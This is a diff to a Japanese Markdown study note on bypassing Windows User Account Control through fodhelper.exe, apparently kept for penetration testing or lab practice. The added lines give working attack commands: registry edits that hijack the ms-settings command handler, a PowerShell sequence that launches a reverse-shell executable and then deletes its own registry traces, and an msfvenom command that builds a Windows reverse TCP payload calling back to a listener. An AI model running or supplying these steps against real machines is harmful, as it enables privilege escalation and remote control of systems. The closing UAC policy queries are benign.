@@ -85,6 +85,14 @@
   REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
   ```
 
+* レジストリが正しく設定されたことを確認する
+
+  ```
+  REG QUERY HKCU\Software\Classes\ms-settings\Shell\Open\command
+  ```
+
+  
+
 * 再度fodhelper.exeを実行するとコマンドプロンプトが立ち上がる
 
   ![image-20230106081939053](img/Windows/UACByPass/image-20230106081939053.png)
@@ -97,6 +105,22 @@
   net user admin Ev!lpass
   ```
   
+* powershellで実行するパターン（リバースシェル実行版）
+
+  ```
+  New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+  New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+  Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c start C:\Users\Administrator\rev_1234.exe" -Force
+  Start-Process "C:\Windows\System32\fodhelper.exe"
+  Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+  ```
+
+  ※リバースシェルの実行時のコマンドの記載に注意
+
+  ```
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=12345 -f exe > rev_12345.exe
+  ```
+
   
 
 ### UACME
@@ -155,4 +179,24 @@ https://github.com/hfiref0x/UACME
      * Mandatory LabelがHighになっていること
 
      * sedebugprivilegeがついていること
-     
+
+
+
+### UAC設定(まだ未完成。詳細はURL参照)
+
+https://book.hacktricks.xyz/windows-hardening/authentication-credentials-uac-and-efs/uac-user-account-control
+
+```cmd
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    EnableLUA    REG_DWORD    0x1
+```
+
+```cmd
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
+    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
+```
+
